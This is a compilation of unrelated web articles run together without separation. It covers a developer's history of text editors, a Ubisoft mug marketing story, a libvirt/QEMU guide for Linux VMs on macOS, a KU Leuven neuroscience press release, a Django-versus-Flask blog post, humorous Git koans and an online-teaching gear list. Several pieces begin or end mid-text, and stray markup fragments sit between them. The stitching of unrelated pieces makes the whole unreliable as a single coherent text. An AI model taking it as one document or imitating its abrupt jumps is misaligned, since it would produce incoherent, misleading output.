<p>However, it was not to last. Even with code mode I felt like I wasn't a <span>programmer</span>, whatever that meant. I felt like I needed more of a hacker-ish interface on which to work my magic. </p>
<h2><code>2011</code> Coda</h2>
<p>Yes, same year as Dreamweaver. After a bit of Dreamweaver I discovered Coda, a pretty nifty text editor that's <a href="https://www.panic.com/coda/">still around</a> (as of 2020-08-20). Why do I say that as if it's a big deal? Well, I'd be surprised if anyone who started programming after 2013 knows about it. This is not to say anything bad about the product, I just never met a single other programmer who had used it.</p>
<p>The cool feature that drew me in to Coda was that it could know about your websites. As far as I remember it was pitched as a great editor for creating front-end sites (JS, CSS, HTML). Back then my move was to write some code, open an FTP app and then drag/drop the files into it. Coda handled this nicely and saved me time. </p>
<h2><code>2013</code> Sublime Text</h2>
<p>Then, the programming world collectively gasps as Sublime Text 2 sweeps over the industry (* I doubt the Vim/Emacs people cared much, but as  you can see I was not yet among their numbers).</p>
<p>Sublime Text was just <span>awesome</span>. It was <span>fast</span>. It was minimal yet powerful which appealed to the power user in me. It was <span>not</span> intuitive, it was <span>not</span> discoverable, it was configured via JSON! It was exactly what I wanted.</p>
<p>For two whole years Sublime Was my primary editor and it was great. Along the way it taught me the power of dedicated tools, rather than an integrated suite. I used different apps for my terminal, my FTP client and my editor. </p>
<p>Of course my time with Sublime and the productivity it won me made me want more, and thus paved the way towards the black hole of text editors, the editor form which—once you have learned it—you will never fully detach yourself.</p>
<h2><code>2015</code> Vim</h2>
<p>In 2015 it finally clicked. This was something of a watershed moment in my text editing career. After years of false starts Vim finally took hold of my fingertips and things have never been the same since.</p>
<p>For anyone unaware, Vim is an ancient text editor from the 70s¹ that might already be installed on your computer. It's claim to fame is that it let's you edit <span>any text</span> with only the keyboard. No mouse interaction whatsoever. </p>
<p>Vim is hard to learn. Significantly harder than learning touch-typing. Anyone who already knows how to program but does't know Vim could probably pick it up in a month. However, it took me years. This was probably due to the fact that even I have my limits when it comes to "productivity hacking" and Vim will really, <span>really</span> decrease your productivity for a time. So I never used it much, just gave it another try here and there and eventually it stuck.</p>
<h3>Is it worth it? </h3>
<p>Yes, but it's not for everyone. </p>
<p>If you write a lot of code, or even just prose, using Vim is nothing short of magical. It feels like being in the future already, when computers simply do what we think. </p>
<p>A mouse is an imprecise device. Analog motion (i.e. your hand sliding a mouse across a desk) is relatively intuitive, but it's slow compared to directly telling the computer what you want. Anyone who's used software professionally for long enough understands this. Designers, architects, authors, anyone who uses a computer as a creative tool and uses it <span>a lot</span> eventually feels the strain of repetitive interactions. That's why professional software packages have numerous hotkeys. Even your operating system has numerous hotkeys, even if you don't know them or use them much.</p>
<p>When you're using Vim, everything is a hotkey. Every action you take you take with keys, which offers a great deal of precision and speed when it comes to editing text. </p>
<p>A quick example. Let's say you want to select all the text "here, within these quotes." What do you do? Normally, you just drag the mouse over all the text within the quotes and start typing. No problem! Now consider you have to do this many times a day, perhaps hundreds of times a day, with different text. Sometimes the text wraps around the screen, causing you to have to move your mouse further. Sometimes you accidentally drag too far or not far enough, causing you to have to hit undo and try again. This may all sound minor, but again, consider having to do it hundreds of times a day.</p>
<p>Now, if you're a Vim user you just type <code>ci"</code>. Three characters. The mnemonic for this sequence is "change inner <code>"</code>." The interesting thing is you can use that same <code>ci</code> "change inner ..." command with other characters. For instance <code>ci'</code> will let you change all the text inside single quotes. <code>ci(</code> will let you change all the text inside parens, and so on. It's quite a flexible and highly productive system (once you learn it).</p>
<h2><code>2016</code> Vim + Atom</h2>
<p>Enter Atom. I actually don't have a lot to say about Atom. I used it as my secondary editor since, again, once you've internalized Vim you never go back. However, Vim has a significant drawback: You have to program it to make it play nicely with new languages. That's right, you have to write code just to get your editor to let you write more code in an appealing way.</p>
<p>This is where Atom came in. It's a mainstream text editor in the sense that it has lots of features built-in and it will do its best to help you along the way. It also has a plugin repository where you can search for new plugins that do things like support new programming languages. It even has—and this is key—a plugin to emulate Vim!</p>
<p>So I ended up using Atom whenever I had to work with code that I hadn't yet configured Vim for. It worked out of the box, it was intuitive and it sort of supported Vim-like editing. </p>
<p>Perhaps most importantly, at this point my company had hired other developers and as the senior member of the team I needed to be able to recommend a way to edit our codebase—that recommendation was Atom.</p>
<h2><code>2018</code> Vim + VSCode</h2>
<p>So after a couple of years I decided to revisit VSCode. I honestly don't know why, but it became hugely popular and so it came across my radar again. It's a great text editor, but in my view it fills the space that Atom was in so I'm not sure why anyone switched 🤷‍♂️.</p>
<p>Regardless, I tried it out and thought "this is ok." The thing was, at this point I was a much more experienced programmer and <span>really didn't want</span> to spend time not directly solving whatever problem I was working on. I had little patience for configuring text editors, so whenever I tried a new language I would just open up VSCode instead of Vim since it would either immediately work well or have a plugin I could install.</p>
<p>VSCode still filled the space of secondary text editor until one day I discovered <a href="https://github.com/asvetliakov/vscode-neovim">a plugin for VSCode that embeds Vim</a>... 🤯 </p>
<p>Thus the balance switched. Now I use VSCode (in Vim mode) as my primary text editor and Vim as the secondary.</p>
<h2><code>2020</code> Vim + VSCode + Emacs</h2>
<p>And finally we're caught up. 2020 and I'm trying a new text editor. Why? Blame Clojure. Emacs and Lisp languages go very well together so I decided to try out Emacs, and it's pretty neat.</p>
<p>For anyone who doesn't know, Emacs is as old as Vim and has a similar keyboard-centric philosophy. It's also <span>even more</span> customizable than Vim, which is saying quite a lot. However, Emacs is unfortunately famous for forcing your hands into contortions to use various functions. </p>
<p>I only recently started using Emacs, so I can't actually speak to it's long-term utility but it's definitely interesting. Aside from being a lisp-based editor, which highly appeals to me, it also seems to <span>fully</span> support Vim. It emulates Vim but it does it so well that as far as I can tell you get the best of both worlds.</p>

<p>Since I haven't exactly come to any specific point, it's fortunate I didn't start writing this intending to make one. If there was one it would simply be: Pursue your hobbies. </p>
<p>Believe it or not fiddling with text editors brings me joy, so despite the occasional dips in productivity I continue to tinker. Besides, there's always the off chance that I'll become more productive. </p>

<p>This post was discussed on Hacker News: <a href="https://news.ycombinator.com/item?id=24290128">https://news.ycombinator.com/item?id=24290128</a></p>

<p><a href="#footnate">¹</a> Vim has become something of a catchall term for Vi and Vim, which are separate editors. Vi was first and Vim didn't show up until the 90s. </p></div></div>]]>

<p>Chinese designer clothing brand <em>Sheepedia</em> recently launched a joint campaign with Ubisoft.&nbsp;During this event, Sheepedia launched a number of clothing and merchandise related to Ubisoft games.</p>



<p>These include T-shirts with Rabbids images and Ubisoft Logo.&nbsp;But the team had a *problem* of making a cup with Ubisoft Logo on it.&nbsp;This is the case with this cup:</p>



<div><figure><img data-attachment-id="3838" data-permalink="https://pandayoo.com/2020/08/27/ubisoft-released-cups-containing-bug-in-a-marketing-campaign-in-china/cleanshot-2020-08-27-at-11-46-362x-2/" data-orig-file="https://pandayoo925336606.files.wordpress.com/2020/08/cleanshot-2020-08-27-at-11.46.36402x.jpg" data-orig-size="1700,846" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CleanShot 2020-08-27 at 11.46.36@2x" data-image-description="" data-medium-file="https://pandayoo925336606.files.wordpress.com/2020/08/cleanshot-2020-08-27-at-11.46.36402x.jpg?w=300" data-large-file="https://pandayoo925336606.files.wordpress.com/2020/08/cleanshot-2020-08-27-at-11.46.36402x.jpg?w=780" src="https://pandayoo925336606.files.wordpress.com/2020/08/cleanshot-2020-08-27-at-11.46.36402x.jpg" alt="Ubisoft Bug Cup"><figcaption>Ubisoft Bug Cup</figcaption></figure></div>



<p>As shown in the pictures, the cup has a rampant bug.&nbsp;Its handle appears on the inside of the cup.</p>



<p>According to a “letter of apology” posted by Sheepedia on <a rel="noreferrer noopener" href="https://weibo.com/7411688348/JhPdHCqvz" target="_blank">Weibo</a>, they received a notice from the factory at the beginning of this month.&nbsp;The factory says the quality of the cup is very good, but there seems to be something wrong with the mold.&nbsp;After receiving the notification, Sheepedia carried out two weeks of DEBUG work, but failed to make it correct.</p>



<p>In the letter, Sheepedia said that as the product is no longer suitable for use as a water cup, they will no longer sell the product and will present it as a collection to Ubisoft fans in the near future.&nbsp;Ubisoft (China) officials forwarded the letter of apology on Weibo and confirmed the incident.</p>

<p>The whole thing didn’t seem like a real accident, but a viral marketing.</p>



<p>The Weibo post got more than 8000 retweets views in just one hour.( Update after 6 hours: 25000 retweets)&nbsp;Many Chinese Ubisoft fans think that this is really worth buying Ubisoft souvenirs, and have asked Sheepedia to mass produce and sell this cup.</p>



<p>Here are some of the goods really sold at this event:</p>

<p>I first learned about <code>libvirt</code> and <code>QEMU</code> three years ago when I wrote a guide on <a href="https://github.com/yoonsikp/macOS-KVM-PCI-Passthrough">how to virtualize macOS on a Linux system</a>. Today I will be showing the opposite, virtualizing Linux on macOS using the same tools. I was surprised that with so many software developers using MacBooks everyday, nobody has created a guide on how to use <code>libvirt</code> and <code>QEMU</code> with macOS.</p>
<p>Why is <code>libvirt</code> and <code>QEMU</code> better? First of all, it's free and open-source. Unlike Parallels Desktop and VMWare Fusion, you won't need to pay for expensive subscriptions or manage licenses. There does exist an open-source alternative (from Oracle!) called VirtualBox, which works pretty well. However, VirtualBox does not support macOS's <a href="https://developer.apple.com/documentation/hypervisor">Hypervisor.Framework</a>, a virtualization API created to limit kernel modification. This means the installer will ask for admin access to install kernel extensions, a feature Apple is now <a href="https://www.zdnet.com/article/apple-deprecating-macos-kernel-extensions-kexts-is-a-great-win-for-security/">phasing out</a> for security reasons. <code>QEMU</code> on the other hand has had support for Hypervisor.Framework since 2018. Just say no to kexts!</p>
<p>Furthermore, like many developers, I like to run VMs headless, i.e. without a desktop GUI, so that I can SSH into them. Running VMs in the background seems like a simple feature, but it requires a lot of complex configuration for both <s><a href="https://www.virtualbox.org/manual/ch07.html#headless-vm-steps">VirtualBox</a></s> and <a href="https://communities.vmware.com/thread/292873">VMWare Fusion</a>. And Parallels wants you buy the <a href="https://kb.parallels.com/en/123298">Pro Edition</a> to gain access. Market segmentation at its finest... With <code>libvirt</code>, VMs start headless. Plus, when you shutdown macOS, it sends a shutdown signal to your VMs as well.</p>
<p>To be clear, <strong>this method doesn't support USB Passthrough, GPU Passthrough, or bridge networking.</strong> But if you just need to test, for example, node.js or nginx on a Linux VM, then this method is great.</p>
<h3 id="installinglibvirtandqemu">Installing libvirt and QEMU</h3>
<ol>
<li>First, install <a href="https://brew.sh/">homebrew</a>, which is a package manager for macOS.</li>
<li>Run <code>brew install qemu gcc libvirt</code>. If you installed <code>libvirt</code> version 6.6.0, then also run the following command in Terminal (<a href="https://github.com/Homebrew/homebrew-core/issues/59738">GitHub issue</a>):<pre><code>for f in /usr/local/Cellar/libvirt/6.6.0/lib/libvirt/*/*.bundle; do ln -s $f ${f%.bundle}.so; done
</code></pre>
</li>
<li>Since macOS doesn't support QEMU security features, we need to disable them:<pre><code>echo 'security_driver = "none"' &gt;&gt; /usr/local/etc/libvirt/qemu.conf
echo "dynamic_ownership = 0" &gt;&gt; /usr/local/etc/libvirt/qemu.conf
echo "remember_owner = 0" &gt;&gt; /usr/local/etc/libvirt/qemu.conf
</code></pre>
</li>
<li>Finally start the libvirt service, with <code>brew services start libvirt</code>. It will start after boot as well.</li>
</ol>
<h3 id="installingubuntuserver2004">Installing Ubuntu Server 20.04</h3>
<p>There are two ways to access the virtual display of the VM, either using a VNC client or the virt-viewer program. I recommend <a href="https://www.realvnc.com/">RealVNC Viewer</a>. The VNC client is responsive and quick to install, but if you have multiple VMs you need to manually manage the different ports. With virt-viewer, you get a popup with all the VMs currently running, but it is laggy and takes an eternity to install. <a href="https://github.com/jeffreywildman/homebrew-virt-manager">virt-viewer</a> can be installed through homebrew. The rest of this guide uses VNC.</p>
<ol>
<li>
<p>Create a <code>vms</code> folder in your home directory, and generate a disk image. Change <code>50g</code> to the size of your prefered disk:</p>
<pre><code>mkdir ~/vms &amp;&amp; cd ~/vms
qemu-img create -f qcow2 ubuntu.qcow2 50g
</code></pre>
</li>
<li>
<p>Download the <a href="https://releases.ubuntu.com/20.04/ubuntu-20.04.1-live-server-amd64.iso">Ubuntu Server 20.04 Install Image</a> and my <a href="https://raw.githubusercontent.com/yoonsikp/vm_configs/master/ubuntu.xml">libvirt XML template</a> and place the .iso and .xml files in the same folder.</p>
</li>
<li>
<p>Modify the following elements in the <code>ubuntu.xml</code> file to match your your VM preferences and file paths. Save, then run <code>virsh define ubuntu.xml</code> followed by <code>virsh start ubuntu</code>.</p>
<pre><code>&lt;domain type='qemu' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'&gt;
&lt;name&gt;name of the VM&lt;/name&gt;
&lt;memory unit='GB'&gt;how much ram&lt;/memory&gt;
&lt;vcpu&gt;how many cpus&lt;/vcpu&gt;
...
&lt;disk type='file' device='disk'&gt;
&lt;source file='full path to your qcow2 file'/&gt;
...
&lt;disk type='file' device='cdrom'&gt;
&lt;source file='full path to your install iso'/&gt;
</code></pre>
</li>
<li>
<p>Start RealVNC Viewer and connect to <code>localhost</code>. Click the <code>Ctrl+Alt+Del</code> button to reboot the machine, and quickly press <code>Esc</code> to get into the boot menu. Press the number that matches the Ubuntu Server image.<br>

</li>
<li>
<p>Install Ubuntu Server normally, making sure to enable the SSH server. Once it restarts you can connect to the VM from your terminal by running <code>ssh -p 2222 user@localhost</code>.</p>
</li>
<li>
<p>To send a shutdown signal to your VM, run <code>virsh shutdown ubuntu</code>. To force shutdown, run <code>virsh destroy ubuntu</code>.</p>
</li>
<li>
<p>To forward a port, e.g. port 443 from the VM to port 8443 locally, run the following: <code>ssh -p 2222 -L8443:localhost:443 user@localhost</code></p>
</li>
</ol>
<h3 id="multiplevms">Multiple VMs</h3>
<p>If you want to create multiple VMs, create an XML file for each machine with a unique UUID, VM name, and VNC port. Also, change the <code>hostfwd</code> argument so that each VM exposes a different port for SSH, e.g. <code>2223</code> instead of <code>2222</code>. After you have defined them all, you can get a list of the VMs that are currently running with <code>virsh list</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="parent-fieldname-text">
          <p>For the first time ever, neurophysiologists of KU Leuven, Harvard and the University of Kyoto have succeeded in reversibly disabling a connection between two areas in the brains of primates while they were performing cognitive tasks and their whole brain activity was being monitored. The disconnection had a negative impact on the motivation of the animals, but not on their learning behaviour. The study, which was published in <em>Neuron</em>, may eventually lead to more targeted treatments for certain brain disorders.</p>

<p>Learning is crucial to man’s survival. The brain’s reward system plays an important part in this. Babies learn to hold their cup to be able to drink on their own. As a student, you learn skills that are useful for your career. In times of COVID-19, we learn to adapt quickly to measures in order to avoid infections – or at least a fine or disapproving look. In addition to reward, motivation is another important factor when it comes to learning. Without motivation, not even the smartest student would ever obtain a degree. But what is most important: motivation or reward?</p>

<p>Wim Vanduffel and his colleagues investigated whether a specific brain pathway is crucial for motivation or reward-driven learning. In a first task, the animals had to put in a big effort to get a big reward, or a small effort for a smaller reward. The researchers showed two simple shapes on a screen. The primate learned, for example, that he received more orange juice when he looked at a red triangle than when he looked at a blue circle. He also had to look at the triangle for longer and, thus, put in more effort to receive the bigger reward. So, the primate had to be strongly motivated if he wanted the bigger reward.</p>

<blockquote>
<p>In the very few pathway-selective experiments published so far, monkeys did not have to perform cognitive tasks, nor was whole brain activity sampled.</p>

<p>– neurophysiologist Wim Vanduffel</p>
</blockquote>

<p>In a second task, the primate again had to look at two shapes. In this case, however, the choice for one shape was linked to a higher probability of getting orange juice than the choice for the other one. The size of the reward was the same, but looking at one shape was rewarded more often than looking at the other shape.</p>

<p>Just like people, primates learn to select the stimulus that yields the most reward very quickly; they try to maximise their profits. In a later stage, the researchers altered the chances of getting a reward. Without the primate knowing, the shape that previously yielded less reward suddenly became the most profitable. Once again, as with humans, primates learn to change strategies quickly by choosing the new, more profitable stimulus.</p>

<figure><img src="https://nieuws.kuleuven.be/beelden/2020/202008-vanduffel-neuron.png/@@images/dbd40f02-7f5e-4a09-901c-770e51dd396d.png" alt="" title="202008 Vanduffel Neuron" width="400" height="247">
<figcaption>The researchers temporarily switched off the connection between the ventral tegmental area (VTA) and the nucleus accumbens (NAc). As a result, the monkeys' motivation to work harder for a bigger reward decreased.&nbsp;</figcaption>
</figure>

<h3>Decrease in motivation</h3>

<p>Next, the researchers reversibly disabled a specific pathway. This pathway, the connection between two important cerebral nuclei of the reward system, mostly produces dopamine. The intervention had a strong effect on the motivation of the animals during the first task. Suddenly, the animals always went for the easy small reward instead of the big reward that took more effort. There was no change in behaviour during the second reinforcement-based learning task. The animals figured out which stimulus was the most profitable as quickly as the first time.</p>

<p>This specific pathway is, therefore, important to keep motivation up in order to make greater efforts, but not to learn about changes in links between a stimulus and a reward.</p>

<p>The researchers used functional MRI scans to look at the brain activity of the primates. When the pathway was disabled, they noticed a surprising increase in functional connectivity between areas of the temporal and frontal cerebral cortex: the areas are activated more synchronously. This increase was, therefore, linked to a decrease in motivation.</p>

<h3>First time</h3>

<p>"This is the first time that scientists have succeeded in reversibly disabling a specific pathway between two areas in the brains of primates while they perform cognitive tasks and their whole brain activity is being monitored", explains Professor Vanduffel. In earlier studies, brain areas were usually activated or deactivated in their entirety, which has an impact on all connections of that specific area. “In the very few pathway-selective experiments published so far, monkeys did not have to perform cognitive tasks, nor was whole brain activity sampled. Contrary to the consensus so far, which is mainly based on rodent research, it appears that this pathway in the brain's reward system is more important for the motivation to make big efforts than for reward-based learning.”</p>

<h2>Psychiatry</h2>

<p>A lack or excess of motivation plays an important role in many psychiatric disorders, including depression, compulsive behaviour, addiction, anxiety disorders, mood disorders and schizophrenia. “Our study provides new perspectives to increase or decrease the activity in specific pathways without affecting an entire area or brain system, because other pathways that originate from the same cerebral nucleus remain unaffected”, says Professor Vanduffel. “This is not the case for methods in which an entire area and, therefore, all connections of that area are affected. This opens the door to much more precise interventions in brain systems and, subsequently, the development of more effective therapies for brain disorders with fewer side effects.</p>

  <div itemprop="articleBody">
    <p>The question of opinionated web frameworks is divisive and has surely ruined its share of family dinners.
Install django or rails and most developers fall into one of two camps:</p>

<p><strong>Camp 1</strong>, amazing, I know exactly where everything goes, there’s a right way to do everything, and the batteries are in the kitchen sink, as god and DHH intended.</p>

<p><strong>Camp 2</strong> runs <code>ls</code>, then <code>find</code>, then googles ‘django without project skeleton’, then googles ‘do I check all the django files in or what’, then says ‘who fuck shit all over my repo’.</p>

<ul id="markdown-toc">
  <li><a href="#toolbeltism" id="markdown-toc-toolbeltism">Toolbeltism</a></li>
  <li><a href="#graphql-or-" id="markdown-toc-graphql-or-">Graphql, or …</a></li>
  <li><a href="#ive-come-around" id="markdown-toc-ive-come-around">I’ve come around</a></li>
</ul>



<p>Tools like flask (or its various async clones) appeal to camp 2.
They tend to integrate functionality by importing something and then making a function call to ‘wire it up’.</p>

<p>I’m in camp 2 but I’m starting to rethink my life choices, because I’ve spent 3 of the last 6 months writing and rewriting user login for different small projects.
Now at the end of it I have a small + shitty ‘personal flask tools’ library that has a 60% working auth / login system for flask.
(Note lack of github link – normally I plug my small + shitty OSS projects but this one is particularly small + shitty).</p>

<p>The crazy part is that I’ve met people who have a ‘toolbelt’ that they randomly import to projects and have always assumed those people are stupid and useless.
When I realized mid-year that I’m a toolbelter now, I started to ask myself some hard questions.</p>

<p>If I’d started with django I’d be done already.
Investing in learning django comes at the cost of a messy repo but <em>saves time</em>.
And I learned from watching one of the latter-day marvel movies at 3x in the second half of a plane trip that no amount of money can buy a minute of time.</p>

<h2 id="graphql-or-">Graphql, or …</h2>

<p>Someone posted an article to HN with some apples-to-nuts comparison like ‘graphql is better than python’ and the comments were not bad.</p>

<p>In particular <a href="https://news.ycombinator.com/item?id=23487072">this one</a> which I hereby plagiarize most of:</p>

<blockquote>
  <p>Looking through some of the code for Sourcehut, there’s an insane amount of boilerplate or otherwise redundant code[1]. The shared code library is a mini-framework, with custom email and validation components[2][3]. In the ‘main’ project we can see the views that power mailing lists and projects[4][5].</p>
</blockquote>

<blockquote>
  <p>I can’t help but think “why Flask, and why not Django” after seeing all of this. Most of the repeated view boilerplate would have gone ([1] could be like 20 lines), the author could have used Django rest framework to get a quality API with not much work (rather than building it yourself[6]) and the pluggable apps at the core of Django seem a perfect fit.</p>
</blockquote>

<blockquote>
  <p>I see this all the time with flasks projects. They start off small and light, and as long as they stay that way then Flask is a great choice. But they often don’t, and as the grow in complexity you end up re-inventing a framework like Django but worse whilst getting fatigued by “Python” being bad.</p>
</blockquote>

<p>Click through and read the replies, they’re useful.</p>

<h2 id="ive-come-around">I’ve come around</h2>

<p>It still bugs me that django steers me away from the single-file case.
I think that this is a flaw in every language or framework that does it –
most of all in mobile native development where focusing on single-file build would IMO fix a lot of sharp edges in the buildsystem.</p>

<p>But django / rails also provide key opinionated design choices that make full-stack plugins possible, i.e. plugins that ‘work with the app’.
These choices are:</p>

<ul>
  <li>standard DB connection / pool</li>
  <li>the framework handles migrations, so plugins can generate tables and maintain them</li>
  <li>user and session management are consistent so plugins can build on them (oauth, for example)</li>
</ul>

<p>Django and rails both have heavy + powerful ORMs; I’m less sure of the necessity there.</p>

<p>I wish there were something like django-lite which provided only the full-stack plugin glue and let me do a little BYO to create a working app.
I think there’s value in supporting one liners that correctly install sophisticated behavior in your app, maybe even beyond the backend – like it could create cloud resources or frontend stuff.
That said, given how my year has gone, I’m 1000% invested in using the right tools, and will be shopping in the ‘batteries included’ aisle this christmas.</p>

<p>A Python programmer handed her <code>~/.gitconfig</code> to Master Git.  Among the many
lines were the following:</p>

<pre><code>[alias]
; Explicit is better than implicit.  If we want to merge
; we should do so ourselves.
pull = pull --ff-only</code></pre>

<p>Master Git nodded.  "<code>git pull origin master</code>," said the programmer.</p>

<p>Master Git pulled down the latest changes on <code>master</code> and automatically merged
them with the programmer's changes.</p>

<p>"But Master Git, did I not say to only fast-forward in my configuration?!" she
cried.</p>

<p>Master Git looked at her, nodded, and said nothing.</p>

<p>"Then why did you not warn me of a problem with my configuration?" she asked.</p>

<p>Master Git replied: "there was no problem."</p>

<p>Months later the programmer was reading <code>git --help config</code> for a different
reason and found enlightenment.</p>

<h2 id="s2-one-thing-well"><a href="#s2-one-thing-well">One Thing Well</a></h2>

<p>A UNIX programmer was working in the cubicle farms.  As she saw Master Git
traveling down the path, she ran to meet him.</p>

<p>"It is an honor to meet you, Master Git!" she said.  "I have been studying the
UNIX way of designing programs that each do one thing well.  Surely I can learn
much from you."</p>

<p>"Surely," replied Master Git.</p>

<p>"How should I change to a different branch?" asked the programmer.</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I create a branch?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>"And how should I update the contents of a single file in my working directory,
without involving branches at all?"</p>

<p>"Use <code>git checkout</code>."</p>

<p>After this third answer, the programmer was enlightened.</p>

<h2 id="s3-only-the-gods"><a href="#s3-only-the-gods">Only the Gods</a></h2>

<p>The great historian was trying to unravel the intricacies of an incorrect merge
that had happened many months ago.  He made a pilgrimage to Master Git to ask
for his help.</p>

<p>"Master Git," said the historian, "what is the nature of history?"</p>

<p>"History is immutable.  To rewrite it later is to tamper with the very fabric of
existence."</p>

<p>The historian nodded, then asked: "Is that why rebasing commits that have been
pushed is discouraged?"</p>

<p>"Indeed," said Master Git.</p>

<p>"Splendid!" exclaimed the historian.  "I have a historical record of a merge
commit with two parents.  How can I find out which branch each parent was
originally made on?"</p>

<p>"History is ephemeral," replied Master Git, "the knowledge you seek can be
answered only by the gods."</p>

<p>The historian hung his head as enlightenment crushed down upon him.</p>

<h2 id="s4-the-hobgoblin"><a href="#s4-the-hobgoblin">The Hobgoblin</a></h2>

<p>A novice was learning at the feet of Master Git.  At the end of the lesson he
looked through his notes and said, "Master, I have a few questions.  May I ask
them?"</p>

<p>Master Git nodded.</p>

<p>"How can I view a list of <em>all</em> tags?"</p>

<p>"<code>git tag</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> remotes?"</p>

<p>"<code>git remote -v</code>", replied Master Git.</p>

<p>"How can I view a list of <em>all</em> branches?"</p>

<p>"<code>git branch -a</code>", replied Master Git.</p>

<p>"And how can I view the current branch?"</p>

<p>"<code>git rev-parse --abbrev-ref HEAD</code>", replied Master Git.</p>

<p>"How can I delete a remote?"</p>

<p>"<code>git remote rm</code>", replied Master Git.</p>

<p>"And how can I delete a branch?"</p>

<p>"<code>git branch -d</code>", replied Master Git.</p>

<p>The novice thought for a few moments, then asked: "Surely some of these could be
made more consistent, so as to be easier to remember in the heat of coding?"</p>

<p>Master Git snapped his fingers.  A hobgoblin entered the room and ate the novice
alive.  In the afterlife, the novice was enlightened.</p>

<h2 id="s5-the-long-and-short-of-it"><a href="#s5-the-long-and-short-of-it">The Long and Short of It</a></h2>

<p>Master Git and a novice were walking along a bridge.</p>

<p>The novice, wanting to partake of Master Git's vast knowledge, said:
"<code>git branch --help</code>".</p>

<p>Master Git sat down and lectured her on the seven forms of <code>git branch</code>, and
their many options.</p>

<p>They resumed walking.  A few minutes later they encountered an experienced
developer traveling in the opposite direction.  He bowed to Master Git and said
"<code>git branch -h</code>".  Master Git tersely informed him of the most common <code>git
branch</code> options.  The developer thanked him and continued on his way.</p>

<p>"Master," said the novice, "what is the nature of long and short options for
commands?  I thought they were equivalent, but when that developer used <code>-h</code> you
said something different than when I said <code>--help</code>."</p>

<p>"Perspective is everything," answered the Master.</p>

<p>The novice was puzzled.  She decided to experiment and said "<code>git -h branch</code>".</p>

<p>Master Git turned and threw himself off the railing, falling to his death on the
rocks below.</p>

<p>Upon seeing this, the novice was enlightened.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7d26e9b4ac55b229ffd2"><div><p>This August, I started teaching <a href="https://www.modulo.app/manishamodule">a digital learning pod</a> for Kindergarten-2nd grade students. </p><p>When I decided I was going to run an online learning pod, I started thinking about ways to create engaging educational opportunities for kids online. I knew that teaching on an online medium was going to be very different than teaching in a physical classroom.  </p><p>Rather than grumble too much about how much better teaching in-person was, I decided to try to make the most out of my new virtual classroom. They say that <a href="https://reggioemilia2015.weebly.com/environment-as-a-third-teacher.html">the environment is the child’s third teacher</a>. Much like Maria Montessori developed materials to make her classroom environment conducive to learning, I knew I needed to find the best tools possible (software and hardware) to support kids and teachers to optimize this online learning environment for learning. </p><p>Fortunately, many of the parents in my group work in tech, so they were happy to lend a hand and help me problem-solve to make sure their kids had a good experience in the group.</p><p>Teaching a group of Kindergarten-2nd grade students online presented some unique challenges. When we started, it was painfully noisy for all involved, and kids were constantly disappearing -  slipping outside the frame of the camera.  Some younger children are often difficult to understand as is, not to mention with the additional obstacle of having their voices travel through the internet to my computer speaker . The result was that kids were bored and I thought I might lose my mind from the noise. </p><p>We tested dozens of different conferencing platforms, tablets, headphones and other unique devices and software solutions to get our group communicating well online.</p><p>My original goal was to get to a point where we would be able to provide a nice social experience 2x/week for 45 minutes. I told my tech savvy parents I needed to find a way where I could hear the kids whispering across the room, see them lap down or do a jumping jack. It was an ambitious goal, but one month in, we’ve surpassed by expectations.</p><p>Now, by using the right tools, teaching zoom etiquette and choosing activities that translate well to an online environment, I’ve found 4 and 5 year old kids (and even children are young as 3) are begging to stay online 3 hours after class has started! They are moving and jumping around, actively participating in class discussions and making meaningful friendships with other children across the country. </p><p>This is what we’ve found works best to allow lots of movement, engagement and clear sound. (And also helps stop me from getting tired or worn out when I teach)</p><p><strong>Here are the tools I recommend for group learning online:</strong></p><ul data-rte-list="default"><li><p><a href="https://zoom.us/">Zoom for conferencing</a>. Zoom simply does sound and video for groups better than any other platform. </p></li><li><p>*<a href="https://www.amazon.com/Gamma-Ray-Trust-Blocking-Glasses/dp/B083ZKY9TH/">Gamma Ray Blue Light Blocking Glasses</a> to prevent eye strain (for teachers)</p></li><li><p><a href="https://www.amazon.com/Xenvo-iPhone-Camera-Lens-Clip/dp/B01A6D2JVI/">Xenvo Pro Lens Kit</a> so you can see a large area, kids don’t have to sit still and feel free to move around the room</p></li><li><p><a href="https://www.apple.com/airpods-pro">*Airpod Pro</a> for the best headphones that won’t fall out of small ears when doing jumping jacks, have great sound </p></li><li><p><a href="https://www.apple.com/macbook-air/">Macbook</a> for zoom&nbsp;and most apps.</p></li><li><p><a href="https://www.amazon.com/Nulaxy-Ergonomic-Adjustable-Computer-Compatible/dp/B077B9W343">Nulaxy Laptop Stand</a> to make us look more glamorous when we record sessions (double-chin eliminated!) and also allows kids to stand and move about, not sit still.</p></li><li><p><a href="https://krisp.ai/">Krisp.ai</a> to reduce background noise on zoom</p></li><li><p>If you can also afford an <a href="https://www.apple.com/ipad-pro">ipad</a>, please get one because this is best for IOS apps which are amazing to support your children's learning.  The new Ipad pro is best for screen sharing.</p></li></ul><p>I’m privileged to be able to afford the tools to support my teaching. Many of the families in my group are privileged to be able to purchase tools to support their children’s learning. And we’ve been able to purchase devices for those who can’t.  An estimated 22% of US students don’t have access to a single computer to help them learn remotely. This is a travesty and one we’re working around the clock to change through Schoolclosures.org and our <a href="https://www.gofundme.com/f/givecomputers">Give Computers</a> campaign. </p><p>While I’m excited to share these tools, I’m also outraged and downhearted by the growing divide between rich and poor students due to lack of access to technology. </p><p>If you are on a budget, I strongly recommend investing in an Ipad to cover all your key bases. Generally, your cell phone plan will let you pay for your Ipad on a payment plan. An Amazon kindle will also do. </p><p>Families looking for free hardware or software should apply to <a href="http://www.givecomputers.org/">givecomputers.org</a></p><p>For families who are still struggling to find a device to support their teaching or child’s learning, please contact us so we can give you a hand. We want to help everyone we can to get the technology 